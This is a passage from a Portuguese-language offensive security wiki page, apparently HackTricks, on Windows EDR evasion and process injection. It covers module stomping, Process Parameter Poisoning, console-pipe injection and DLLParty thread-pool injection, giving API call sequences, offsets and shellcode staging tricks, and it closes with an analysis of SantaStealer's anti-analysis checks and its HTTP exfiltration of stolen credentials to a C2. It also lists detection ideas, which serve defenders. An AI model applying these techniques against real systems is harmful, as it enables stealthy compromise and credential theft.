5. Calcule o **raio de impacto**: se o payload exceder os limites da função selecionada, ele sobrescreverá exports adjacentes que estejam posicionados depois dela na memória.

Helpers de recon/seleção típicos observados em campo:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notas operacionais
- Prefira DLLs **já carregadas** no processo remoto para evitar a telemetria de `LoadLibrary`/carregamentos inesperados de imagens.
- Prefira exports raramente executados pelo aplicativo-alvo; caso contrário, caminhos normais do código podem atingir os bytes modificados antes ou depois da criação da thread.
- Implants grandes geralmente exigem alterar a forma de incorporar o shellcode, de um literal de string para um **inicializador de array de bytes/com chaves**, para que o buffer completo seja representado corretamente no código-fonte do injector.

Ideias de detecção
- Escritas remotas em páginas executáveis respaldadas por imagens (`MEM_IMAGE`, `PAGE_EXECUTE*`), em vez das alocações privadas RWX/RX mais comuns.
- Pontos de entrada de exports cujos bytes na memória não correspondem ao arquivo de origem no disco.
- Threads remotas ou desvios de contexto que começam a execução dentro de um export de DLL legítima cujos primeiros bytes foram modificados recentemente.
- Sequências suspeitas de `VirtualProtect(Ex)` / `WriteProcessMemory` em páginas `.text` de DLLs, seguidas da criação de threads.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) é uma técnica de **injeção de processos / evasão de EDR** que evita o caminho clássico de escrita remota (`VirtualAllocEx` + `WriteProcessMemory`). Em vez de copiar bytes para um processo-alvo já em execução, ela abusa do fato de que o Windows **copia parâmetros de inicialização selecionados de `CreateProcessW` para o processo filho** e os armazena em `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Dados transportadores passíveis de envenenamento copiados por `CreateProcessW`

Dados transportadores úteis:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (com `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restrições práticas dos dados transportadores:

- `lpCommandLine` deve apontar para **memória gravável** para `CreateProcessW` e tem limite de **32.767 caracteres Unicode**, incluindo o terminador nulo.
- `lpEnvironment` deve ser um bloco de ambiente Unicode com strings `NOME=VALOR\0` consecutivas, terminadas por um `\0` adicional.
- `lpReserved` é oficialmente reservado, então o mapeamento de `ShellInfo` deve ser tratado como um detalhe de implementação, não como um contrato documentado e estável.

Isso transforma a criação normal de processos na **primitiva de transferência de payload**. O operador cria o processo filho com dados de inicialização controlados pelo atacante e deixa o Windows realizar a cópia entre processos.

### Fluxo de pesquisa remota sem APIs de escrita remota

Depois que o processo filho é criado, resolva o buffer copiado com primitivas **somente de leitura**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obter `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ler o `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Ler `RTL_USER_PROCESS_PARAMETERS`
5. Usar o ponteiro selecionado:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Fluxo mínimo:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Executando o buffer de parâmetros copiado

A região de parâmetros copiada geralmente tem permissões `RW`, não é executável. Uma cadeia P3 comum é:

1. Criar o processo normalmente (não suspenso)
2. Tornar executável a página de parâmetros escolhida com `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar o handle da thread principal já retornado em `PROCESS_INFORMATION`
4. Redirecionar a execução com `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescrever `RIP`)

Ao contrário dos fluxos clássicos de thread hijacking, isso **não exige** `SuspendThread` / `ResumeThread`; o contexto pode ser alterado diretamente no handle da thread principal retornado.

Isso evita várias APIs comumente monitoradas para injeção:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- muitas vezes, também `SuspendThread` / `ResumeThread`

### Limitação de byte nulo e shellcode em estágios

Os três carriers são **dados de string ou semelhantes a strings**, então um payload bruto que contenha `0x00` é truncado durante a transferência. Uma solução prática é usar um **primeiro estágio sem bytes nulos**, que reconstrói constantes em tempo de execução e, em seguida, carrega um segundo estágio arbitrário.

Um padrão simples é a síntese de constantes baseada em XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Isso permite que o primeiro estágio construa strings na stack, argumentos de API, caminhos de DLL ou um loader de shellcode de segundo estágio sem incorporar bytes nulos no parâmetro transportado.

### Chamadas de API baseadas na stack a partir do primeiro estágio

Quando o primeiro estágio precisa chamar APIs como `LoadLibraryA`, ele pode:

- colocar a string/buffer na stack do processo-alvo
- reservar o **shadow space de 32 bytes do x64**
- definir `RCX`, `RDX`, `R8`, `R9` com constantes ou ponteiros relativos a `RSP`
- manter `RSP` **alinhado a 16 bytes** antes da chamada

Um segundo estágio pode então ser copiado da stack para uma alocação `PAGE_READWRITE`, ter suas permissões alteradas para `PAGE_EXECUTE_READ` com `VirtualProtect` e ser executado com um salto, evitando uma alocação RWX direta.

### Ideias de detecção

Boas oportunidades de investigação mencionadas pelos autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` tornando **executáveis páginas de parâmetros do processo**
- essa alteração de proteção seguida por `SetThreadContext` / `NtSetContextThread`
- leituras remotas do `PEB` e, em seguida, de `RTL_USER_PROCESS_PARAMETERS`
- valores de `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` excepcionalmente longos ou com alta entropia durante a criação do processo

### Observações

- P3 é um **truque de transferência entre processos**, não uma primitiva de execução completa por si só: o parâmetro copiado ainda precisa ter suas permissões alteradas para execução e de um método de redirecionamento da execução.
- `RtlCreateProcessReflection` / Dirty Vanity foi considerado pelos autores, mas rejeitado porque internamente chega a primitivas suspeitas, como `NtWriteVirtualMemory` e `NtCreateThreadEx`.

## Injeção por pipe de STDIN do console

Um processo filho de console interativo também pode ser usado como **primitiva de transferência de payload**. O injector redireciona a entrada padrão do processo filho para um pipe e envia um marcador seguido de shellcode. Depois que o programa de console lê os dados para sua própria memória privada, o injector localiza esse buffer, torna-o executável e redireciona uma thread do processo filho para ele. Isso evita `VirtualAllocEx` e `WriteProcessMemory`, mas ainda é injeção de processo, não um bypass genérico de EDR.<sup>[[41]](#references)</sup>

Apesar da descrição como "named-pipe", a implementação de referência chama `CreatePipe`, que cria um **pipe anônimo**. O Windows implementa pipes anônimos usando internamente objetos de pipe com nomes exclusivos, mas a PoC não seleciona um caminho `\\.\pipe\<name>` nem chama `CreateNamedPipe`. Ela cria handles herdáveis com um descritor de segurança padrão, coloca o handle de leitura em `STARTUPINFO.hStdInput`, define `STARTF_USESTDHANDLES` e inicia um novo processo filho com a herança de handles habilitada. Portanto, essa PoC inicia o executável de console fornecido; ela não conecta seu pipe a um processo existente.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Fluxo de trabalho de referência

A implementação usa a seguinte sequência:<sup>[[41]](#references)</sup>

1. Cria pares de pipes anônimos para `STDIN` e `STDOUT` do processo filho. Desativa a herança nos dois handles do lado do processo pai e fecha no pai as cópias dos handles do lado do processo filho após a criação do processo.
2. Inicia um executável interativo, como `netsh.exe` ou `nslookup.exe`, com `CREATE_NEW_CONSOLE`. O processo filho herda os handles padrão redirecionados.
3. Envia o array binário completo `rawData` com `WriteFile` pelo handle de `STDIN` do lado do processo pai. O programa de console consome os bytes e deixa uma cópia em uma de suas regiões privadas confirmadas.
4. Percorre o espaço de endereçamento do processo filho com `VirtualQueryEx`, lê regiões candidatas `MEM_PRIVATE` com `ReadProcessMemory` e procura o marcador no início de `rawData`.
5. Altera o buffer encontrado para `PAGE_EXECUTE_READWRITE` com `VirtualProtectEx`.
6. Identifica a thread principal, suspende-a, define `RIP` como `found_address + 0x19` com `NtSetContextThread` e retoma sua execução.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

A implementação fornecida é específica para x64: modifica `CONTEXT.Rip`, e seu payload incorporado é shellcode x64. `rawData` começa com um marcador de 25 bytes, então os bytes executáveis começam no deslocamento hexadecimal `0x19`. Ao substituir o payload, preserve esse layout ou atualize juntos o marcador, o vetor de busca, o tamanho do array e o deslocamento de execução. Os comentários do código também listam `0x0A`, `0x0D` e `0x1A` como caracteres inválidos. Esse fluxo de trabalho não altera o token nem os privilégios do processo filho.<sup>[[41]](#references)</sup>

Para exemplos de helpers nativos pequenos e padrões de compilação de payloads, consulte [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Injeção de DLL por callback do thread pool sem shellcode (DLLParty)

DLLParty adapta a injeção de thread pool no estilo PoolParty para fazer um worker existente do alvo chamar `LoadLibraryA`, em vez de executar um stub de callback injetado. Seu primitivo de dispatch é um completion `TP_DIRECT` enfileirado na porta de conclusão de I/O do pool do alvo. Isso não contorna as permissões do processo: o PoC chama `OpenProcess(PROCESS_ALL_ACCESS)` e precisa de memória do alvo legível e gravável, além de handles duplicáveis do worker factory e da porta de conclusão.<sup>[[46]](#references)[[47]](#references)</sup>

No Windows x64, o worker passa um ponteiro para um `TP_CALLBACK_INSTANCE` alocado na stack em `RCX`, o primeiro argumento do callback. `LoadLibraryA` interpreta esse mesmo ponteiro como um `LPCSTR`. No caminho testado, `TppWorkerThread` cria o ponteiro em `RSP+0x178`, enquanto sua primeira gravação comum nesse objeto ocorre em `RSP+0x1d0`. Portanto, um caminho de DLL terminado em nulo que caiba nesse prefixo de 0x58 bytes pode ocupar o início da instância sem ser sobrescrito antes do dispatch. Esta é uma observação específica da build, não uma garantia documentada da ABI do Windows.<sup>[[46]](#references)[[47]](#references)</sup>

O fluxo de trabalho de referência é:<sup>[[46]](#references)[[47]](#references)</sup>

1. Enumerar os handles do alvo com `NtQuerySystemInformation(SystemHandleInformation)` e identificar `TpWorkerFactory` consultando os tipos de objeto. Duplicar um handle do worker factory e consultar `WorkerFactoryBasicInformation`; `StartParameter` fornece o `TP_POOL` remoto. Ignorar factories com `TotalWorkerCount == 0`.
2. Ler `TP_POOL.CompletionPort` e percorrer a lista privada de workers do pool. Na build x64 testada do Windows 10 19045 (`ntdll.dll 10.0.19041.4842`), o início da lista fica em `pool+0x60`; cada link fica em `worker+0x10`, então o slot da instância de callback em `worker+0x38` equivale a `link+0x28`. O PoC verifica o alinhamento dos ponteiros, a reciprocidade dos links, a propriedade do pool, IDs de thread não nulos, nós repetidos e um início de lista estável.
3. Gravar o caminho da DLL em **todos** os slots de worker recuperados, pois qualquer worker pode consumir a completion enfileirada. Colocar um `TP_DIRECT` em memória gravável do alvo com `Callback = LoadLibraryA`. O PoC usa `last_slot-0x500` em uma stack de worker, em vez de `VirtualAllocEx`; esse deslocamento é experimental e não pode colidir com dados ativos da stack.
4. Duplicar o handle da porta de conclusão do alvo e chamar `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. O endereço remoto de `TP_DIRECT` é a chave de conclusão. Um worker existente então chama `LoadLibraryA` usando o ponteiro sobrescrito da instância de callback, carregando uma DLL já acessível ao alvo.

O PoC recebe um PID do alvo (`DLLParty.exe <target_pid>`) e usa um caminho de DLL codificado em `DLLParty.cpp`; defina um caminho acessível ao alvo antes de compilar um executável x64. Ele também usa o endereço de `LoadLibraryA` do próprio processo como callback remoto, portanto presume que esse endereço seja válido no alvo. O código não verifica se o comprimento do caminho cabe no prefixo de 0x58 bytes nem se a travessia dos workers encontrou um slot antes de indexar o último elemento. Revalide os deslocamentos privados, o layout da stack e o espaço gravável para a build do alvo. Omitir `CreateRemoteThreadEx`, shellcode e `VirtualAllocEx` não elimina gravações entre processos nem a telemetria de carregamento de DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Tradecraft do SantaStealer para evasão fileless e roubo de credenciais

SantaStealer (também conhecido como BluelineStealer) ilustra como os info-stealers modernos combinam AV bypass, anti-análise e acesso a credenciais em um único fluxo de trabalho.<sup>[[24]](#references)</sup>

### Verificação do layout do teclado e atraso em sandbox

- Uma flag de configuração (`anti_cis`) enumera os layouts de teclado instalados por meio de `GetKeyboardLayoutList`. Se encontrar um layout cirílico, a amostra cria um marcador `CIS` vazio e encerra a execução antes de iniciar os stealers, garantindo que nunca seja executada em localidades excluídas e deixando um artefato para hunting.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Lógica `check_antivm` em camadas

- A variante A percorre a lista de processos, calcula o hash de cada nome com uma checksum rolling personalizada e compara o resultado com blocklists embutidas de debuggers/sandboxes; repete a checksum para o nome do computador e verifica diretórios de trabalho, como `C:\analysis`.
- A variante B inspeciona propriedades do sistema (limite mínimo de processos, tempo de atividade recente), chama `OpenServiceA("VBoxGuest")` para detectar o VirtualBox Guest Additions e faz verificações de tempo em torno de pausas para detectar a execução passo a passo. Qualquer detecção interrompe a execução antes do lançamento dos módulos.

### Helper fileless + carregamento reflective duplo com ChaCha20

- A DLL/EXE principal incorpora um helper de credenciais do Chromium, que é gravado em disco ou mapeado manualmente na memória; no modo fileless, o próprio código resolve imports/relocations, sem gravar artefatos do helper.
- Esse helper armazena uma DLL de segundo estágio criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após as duas etapas, carrega o blob por reflective loading (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas do [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- As rotinas do ChromElevator usam process hollowing reflective com direct syscalls para injetar em um navegador Chromium ativo, herdar chaves do AppBound Encryption e descriptografar senhas/cookies/cartões de crédito diretamente de bancos de dados SQLite, apesar das proteções do ABE.

### Coleta modular em memória e exfiltração HTTP em blocos

- `create_memory_based_log` percorre uma tabela global de ponteiros para funções `memory_generators` e inicia uma thread para cada módulo habilitado (Telegram, Discord, Steam, capturas de tela, documentos, extensões de navegador etc.). Cada thread grava os resultados em buffers compartilhados e informa a quantidade de arquivos após uma espera de ~45s pelo join.
- Ao terminar, tudo é compactado com a biblioteca `miniz` vinculada estaticamente e salvo como `%TEMP%\\Log.zip`. Em seguida, `ThreadPayload1` aguarda 15s e transmite o arquivo em blocos de 10 MB por HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary de navegador `multipart/form-data` (`----WebKitFormBoundary***`). Cada bloco inclui `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional e, no último bloco, `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [1] [Técnicas avançadas de evasão: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Pilhas de chamadas: chega de passes livres para malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentação](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC para falsificação de pilha de chamadas](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nova cadeia de infecção e ofuscação baseada em ConfuserEx para o DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Você deve confiar no seu zero trust? Contornando as verificações de postura do Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes do ToolShell: explorando as operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abusando de exports encaminhadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventário de exports encaminhadas do Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Ordem de pesquisa de bibliotecas de vínculo dinâmico](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Segurança de processos e direitos de acesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Referência de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Inicializador CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Combatendo EDRs com o respaldo do Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Rompendo a camada de proteção do Windows Defender com a técnica de redirecionamento de pastas](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referência do comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sob a cortina Pure: de RAT a builder e coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – O SantaStealer está chegando: um novo e ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Descriptografia do Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: derrotando malware Node.js com rastreamento de API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [A Bela Adormecida: colocando o Adaptix para dormir com Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Envenenamento de parâmetros de processo](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [A Bela Adormecida II: CFG, CET e falsificação de pilha](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ofuscação de suspensão Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ocultando o Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusando do Chrome Remote Desktop em operações Red Team: um guia prático](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: transformando o driver de remediação do Defender em uma primitiva de operação no kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Código complementar do Function Peekaboo da MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: criando funções com autoproteção usando LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [Código-fonte do InjectSetConsole da TwoSevenOneT](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Função CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Criando um processo filho com entrada e saída redirecionadas](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - Necromancia do GhostPack: reconstruindo ferramentas C# com WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compilando projetos C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Prova de conceito e código-fonte do DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — abusando dos componentes internos do pool de threads para injeção de DLL sem shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Conjunto de dados de benchmark EMBER2024 e ferramentas thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Usando EMBER2024 para avaliar implantes de red team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evadindo detecções baseadas em machine learning](https://msecops.de/blog/posts/ml-evasion/)
{{#include ../banners/hacktricks-training.md}}
